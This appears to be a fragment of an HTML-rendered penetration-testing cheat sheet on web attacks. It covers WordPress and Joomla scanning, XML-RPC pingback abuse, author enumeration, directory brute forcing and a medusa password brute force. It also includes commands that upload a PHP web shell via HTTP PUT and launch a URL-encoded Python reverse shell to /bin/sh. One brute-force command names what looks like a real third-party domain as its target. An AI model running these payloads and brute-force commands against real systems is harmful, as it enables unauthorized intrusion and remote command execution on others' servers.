<span class="n">wpscan</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">221.167</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">u</span><span class="p">,</span><span class="n">ap</span><span class="w"> </span><span class="o">--</span><span class="n">plugins</span><span class="o">-</span><span class="n">detection</span><span class="w"> </span><span class="n">aggressive</span>
<span class="n">wpscan</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">--</span><span class="n">enumerate</span><span class="w"> </span><span class="n">vt</span>
<span class="n">wpscan</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">--</span><span class="n">enumerate</span><span class="w"> </span><span class="n">u</span>
<span class="n">wpscan</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="o">--</span><span class="n">url</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">url</span><span class="o">.</span><span class="n">com</span>



<span class="n">Check</span><span class="w"> </span><span class="n">IP</span><span class="w"> </span><span class="n">behing</span><span class="w"> </span><span class="n">WAF</span><span class="p">:</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2020</span><span class="o">/</span><span class="mi">01</span><span class="o">/</span><span class="mi">22</span><span class="o">/</span><span class="n">discover</span><span class="o">-</span><span class="n">cloudflare</span><span class="o">-</span><span class="n">wordpress</span><span class="o">-</span><span class="n">ip</span><span class="o">/</span>
<span class="n">pingback</span><span class="o">.</span><span class="n">xml</span><span class="p">:</span>
<span class="o">&lt;</span><span class="err">?</span><span class="n">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="s2">&quot;1.0&quot;</span><span class="w"> </span><span class="n">encoding</span><span class="o">=</span><span class="s2">&quot;iso-8859-1&quot;</span><span class="err">?</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">methodCall</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">methodName</span><span class="o">&gt;</span><span class="n">pingback</span><span class="o">.</span><span class="n">ping</span><span class="o">&lt;/</span><span class="n">methodName</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">params</span><span class="o">&gt;</span>
<span class="w"> </span><span class="o">&lt;</span><span class="n">param</span><span class="o">&gt;</span>
<span class="w">  </span><span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span>
<span class="w">   </span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0</span><span class="o">.</span><span class="mf">0.1</span><span class="o">/</span><span class="n">hello</span><span class="o">/</span><span class="n">world</span><span class="o">&lt;/</span><span class="n">string</span><span class="o">&gt;</span>
<span class="w">  </span><span class="o">&lt;/</span><span class="n">value</span><span class="o">&gt;</span>
<span class="w"> </span><span class="o">&lt;/</span><span class="n">param</span><span class="o">&gt;</span>
<span class="w"> </span><span class="o">&lt;</span><span class="n">param</span><span class="o">&gt;</span>
<span class="w">  </span><span class="o">&lt;</span><span class="n">value</span><span class="o">&gt;</span>
<span class="w">   </span><span class="o">&lt;</span><span class="n">string</span><span class="o">&gt;</span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">IP</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="mi">2020</span><span class="o">/</span><span class="mi">01</span><span class="o">/</span><span class="mi">22</span><span class="o">/</span><span class="n">hello</span><span class="o">-</span><span class="n">world</span><span class="o">/&lt;/</span><span class="n">string</span><span class="o">&gt;</span>
<span class="w">  </span><span class="o">&lt;/</span><span class="n">value</span><span class="o">&gt;</span>
<span class="w"> </span><span class="o">&lt;/</span><span class="n">param</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">params</span><span class="o">&gt;</span>
<span class="o">&lt;/</span><span class="n">methodCall</span><span class="o">&gt;</span>

<span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="err">@</span><span class="n">pingback</span><span class="o">.</span><span class="n">xml</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ip</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">xmlrpc</span><span class="o">.</span><span class="n">php</span>

<span class="n">Enum</span><span class="w"> </span><span class="n">User</span><span class="p">:</span>
<span class="k">for</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="p">{</span><span class="mf">1.</span><span class="o">.</span><span class="mi">50</span><span class="p">};</span><span class="w"> </span><span class="n">do</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ip</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">wordpress</span>\<span class="err">?</span><span class="n">author</span><span class="o">=$</span><span class="n">i</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="o">-</span><span class="n">E</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="s2">&quot;Location:.*&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">awk</span><span class="w"> </span><span class="o">-</span><span class="n">F</span><span class="o">/</span><span class="w"> </span><span class="s1">&#39;{print $NF}&#39;</span><span class="p">;</span><span class="w"> </span><span class="n">done</span>

<span class="c1"># Joomscan</span>
<span class="n">joomscan</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w">  </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">joomscan</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w">  </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">--</span><span class="n">enumerate</span><span class="o">-</span><span class="n">components</span>

<span class="c1"># Get header</span>
<span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="c1"># Get options</span>
<span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">OPTIONS</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>

<span class="w">    </span><span class="c1"># With PUT option enabled:</span>

<span class="w">    </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="mf">10.1</span><span class="o">.</span><span class="mf">10.111</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">put</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">put</span><span class="o">.</span><span class="n">url</span><span class="o">=</span><span class="s1">&#39;/test/rootme.php&#39;</span><span class="p">,</span><span class="n">http</span><span class="o">-</span><span class="n">put</span><span class="o">.</span><span class="n">file</span><span class="o">=</span><span class="s1">&#39;/root/php-reverse-shell.php&#39;</span>

<span class="w">    </span><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">PUT</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]);?&gt;&#39;</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.1</span><span class="o">.</span><span class="mf">10.111</span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">cmd</span><span class="o">.</span><span class="n">php</span>
<span class="w">    </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.1</span><span class="o">.</span><span class="mf">10.111</span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">cmd</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">cmd</span><span class="o">=</span><span class="n">python</span><span class="o">%</span><span class="mi">20</span><span class="o">-</span><span class="n">c</span><span class="o">%</span><span class="mi">20</span><span class="o">%</span><span class="mi">27</span><span class="n">import</span><span class="o">%</span><span class="mi">20</span><span class="n">socket</span><span class="p">,</span><span class="n">subprocess</span><span class="p">,</span><span class="n">os</span><span class="p">;</span><span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">);</span><span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="o">%</span><span class="mf">210.1</span><span class="o">.</span><span class="mf">10.111</span><span class="o">%</span><span class="mi">22</span><span class="p">,</span><span class="mi">443</span><span class="p">));</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">);</span><span class="o">%</span><span class="mi">20</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">);</span><span class="o">%</span><span class="mi">20</span><span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">);</span><span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="o">%</span><span class="mi">22</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="o">%</span><span class="mi">22</span><span class="p">,</span><span class="o">%</span><span class="mi">22</span><span class="o">-</span><span class="n">i</span><span class="o">%</span><span class="mi">22</span><span class="p">]);</span><span class="o">%</span><span class="mi">27</span>

<span class="c1"># Get everything</span>
<span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">i</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s2">&quot;User-Agent:Mozilla/4.0&quot;</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="p">:</span><span class="mi">8080</span>

<span class="c1"># Check for title and all links</span>
<span class="n">curl</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">grep</span><span class="w"> </span><span class="s2">&quot;title\|href&quot;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">sed</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;s/^[[:space:]]*//&#39;</span>

<span class="c1"># Look at page with just text</span>
<span class="n">curl</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">html2text</span><span class="w"> </span><span class="o">-</span><span class="n">width</span><span class="w"> </span><span class="s1">&#39;99&#39;</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">uniq</span>

<span class="c1"># Check if it is possible to upload</span>
<span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">OPTIONS</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span>
<span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">v</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">PUT</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">&#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span><span class="n">test</span><span class="o">/</span><span class="n">shell</span><span class="o">.</span><span class="n">php</span>

<span class="c1"># Simple curl POST request with login data</span>
<span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">X</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.11</span><span class="o">/</span><span class="n">centreon</span><span class="o">/</span><span class="n">api</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">action</span><span class="o">=</span><span class="n">authenticate</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="s1">&#39;username=centreon&amp;password=wall&#39;</span>

<span class="n">dotdotpwn</span><span class="o">.</span><span class="n">pl</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">unix</span>

<span class="n">site</span><span class="p">:</span><span class="n">domain</span><span class="o">.</span><span class="n">com</span><span class="w"> </span><span class="n">intext</span><span class="p">:</span><span class="n">user</span>


<span class="c1"># Firebase</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">Turr0n</span><span class="o">/</span><span class="n">firebase</span>
<span class="n">python3</span><span class="w"> </span><span class="n">firebase</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">--</span><span class="n">dnsdumpster</span><span class="w"> </span><span class="o">-</span><span class="n">l</span><span class="w"> </span><span class="n">file</span>
</code></pre></div>

<h3>Url brute force</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># Ffuf</span>
<span class="n">ffuf</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;.htm&#39;</span><span class="p">,</span><span class="s1">&#39;.php&#39;</span><span class="p">,</span><span class="s1">&#39;.html&#39;</span><span class="p">,</span><span class="s1">&#39;.js&#39;</span><span class="p">,</span><span class="s1">&#39;.txt&#39;</span><span class="p">,</span><span class="s1">&#39;.zip&#39;</span><span class="p">,</span><span class="s1">&#39;.bak&#39;</span><span class="p">,</span><span class="s1">&#39;.asp&#39;</span><span class="p">,</span><span class="s1">&#39;.aspx&#39;</span><span class="p">,</span><span class="s1">&#39;xml&#39;</span><span class="p">,</span><span class="s1">&#39;.log&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">-</span><span class="n">lowercase</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.11</span><span class="o">/</span><span class="n">mvc</span><span class="o">/</span><span class="n">FUZZ</span>

<span class="c1"># Dirb not recursive</span>
<span class="n">dirb</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">dirb</span><span class="o">-</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">.</span><span class="n">txt</span>

<span class="c1"># Wfuzz</span>
<span class="n">wfuzz</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">z</span><span class="w"> </span><span class="n">file</span><span class="p">,</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wfuzz</span><span class="o">/</span><span class="n">wordlist</span><span class="o">/</span><span class="n">general</span><span class="o">/</span><span class="n">common</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">hc</span><span class="w"> </span><span class="mi">404</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.11</span><span class="o">/</span><span class="n">FUZZ</span>

<span class="c1"># GoBuster</span>
<span class="n">gobuster</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web_Content</span><span class="o">/</span><span class="n">common</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="s1">&#39;200,204,301,302,307,403,500&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">e</span>
<span class="n">gobuster</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span>
<span class="n">gobuster</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//$</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web_Content</span><span class="o">/</span><span class="n">Top1000</span><span class="o">-</span><span class="n">RobotsDisallowed</span><span class="o">.</span><span class="n">txt</span>
<span class="n">gobuster</span><span class="w"> </span><span class="n">dir</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">common</span><span class="o">.</span><span class="n">txt</span>

<span class="n">dotdotpwn</span><span class="o">.</span><span class="n">pl</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">GET</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="n">unix</span>

<span class="o">./</span><span class="n">dirsearch</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.157</span>

<span class="o">./</span><span class="n">dirsearch</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">101.125</span><span class="p">:</span><span class="mi">8080</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">html</span><span class="p">,</span><span class="n">php</span><span class="p">,</span><span class="n">asp</span><span class="p">,</span><span class="n">aspx</span><span class="p">,</span><span class="n">js</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">404</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">500</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">big</span><span class="o">.</span><span class="n">txt</span>

<span class="o">./</span><span class="n">dirsearch</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">192.168</span><span class="o">.</span><span class="mf">86.125</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="n">html</span><span class="p">,</span><span class="n">php</span><span class="p">,</span><span class="n">asp</span><span class="p">,</span><span class="n">aspx</span><span class="p">,</span><span class="n">js</span><span class="p">,</span><span class="n">elf</span><span class="p">,</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">404</span><span class="p">,</span><span class="mi">403</span><span class="p">,</span><span class="mi">401</span><span class="p">,</span><span class="mi">500</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">dirbuster</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="o">.</span><span class="n">txt</span>

<span class="n">medusa</span><span class="w"> </span><span class="o">-</span><span class="n">h</span><span class="w"> </span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">admin</span><span class="w"> </span><span class="o">-</span><span class="n">P</span><span class="w"> </span><span class="n">wordlist</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">M</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="n">DIR</span><span class="p">:</span><span class="o">/</span><span class="n">test</span><span class="w"> </span><span class="o">-</span><span class="n">T</span><span class="w"> </span><span class="mi">10</span>

<span class="n">Crawl</span><span class="p">:</span>

<span class="n">dirhunt</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">url</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>
<span class="n">hakrwaler</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">url</span><span class="o">.</span><span class="n">com</span><span class="o">/</span>

<span class="n">Fuzzer</span><span class="p">:</span>

<span class="n">ffuf</span><span class="w"> </span><span class="o">-</span><span class="n">recursion</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="o">-</span><span class="n">e</span><span class="w"> </span><span class="s1">&#39;.htm&#39;</span><span class="p">,</span><span class="s1">&#39;.php&#39;</span><span class="p">,</span><span class="s1">&#39;.html&#39;</span><span class="p">,</span><span class="s1">&#39;.js&#39;</span><span class="p">,</span><span class="s1">&#39;.txt&#39;</span><span class="p">,</span><span class="s1">&#39;.zip&#39;</span><span class="p">,</span><span class="s1">&#39;.bak&#39;</span><span class="p">,</span><span class="s1">&#39;.asp&#39;</span><span class="p">,</span><span class="s1">&#39;.aspx&#39;</span><span class="p">,</span><span class="s1">&#39;.xml&#39;</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">-</span><span class="n">lowercase</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">url</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">FUZZ</span>

<span class="n">dirsearch</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">-</span><span class="n">f</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">crm</span><span class="o">.</span><span class="n">comprarcasa</span><span class="o">.</span><span class="n">pt</span><span class="w"> </span><span class="o">--</span><span class="n">extensions</span><span class="o">=</span><span class="n">htm</span><span class="p">,</span><span class="n">html</span><span class="p">,</span><span class="n">asp</span><span class="p">,</span><span class="n">aspx</span><span class="p">,</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">w</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">seclists</span><span class="o">/</span><span class="n">Discovery</span><span class="o">/</span><span class="n">Web</span><span class="o">-</span><span class="n">Content</span><span class="o">/</span><span class="n">raft</span><span class="o">-</span><span class="n">medium</span><span class="o">-</span><span class="n">directories</span><span class="o">-</span><span class="n">lowercase</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">--</span><span class="n">request</span><span class="o">-</span><span class="n">by</span><span class="o">-</span><span class="n">hostname</span><span class="w"> </span><span class="o">-</span><span class="n">t</span><span class="w"> </span><span class="mi">40</span>

<span class="c1">#IIS</span>
<span class="c1">#ViewState:</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">notsosecure</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">exploiting</span><span class="o">-</span><span class="n">viewstate</span><span class="o">-</span><span class="n">deserialization</span><span class="o">-</span><span class="n">using</span><span class="o">-</span><span class="n">blacklist3r</span><span class="o">-</span><span class="ow">and</span><span class="o">-</span><span class="n">ysoserial</span><span class="o">-</span><span class="n">net</span><span class="o">/</span><span class="c1">#PoC</span>

<span class="c1">#WebResource.axd:</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">inquisb</span><span class="o">/</span><span class="n">miscellaneous</span><span class="o">/</span><span class="n">blob</span><span class="o">/</span><span class="k">master</span><span class="o">/</span><span class="n">ms10</span><span class="o">-</span><span class="mi">070</span><span class="n">_check</span><span class="o">.</span><span class="n">py</span>

<span class="c1">#ShortNames</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">irsdl</span><span class="o">/</span><span class="n">IIS</span><span class="o">-</span><span class="n">ShortName</span><span class="o">-</span><span class="n">Scanner</span>
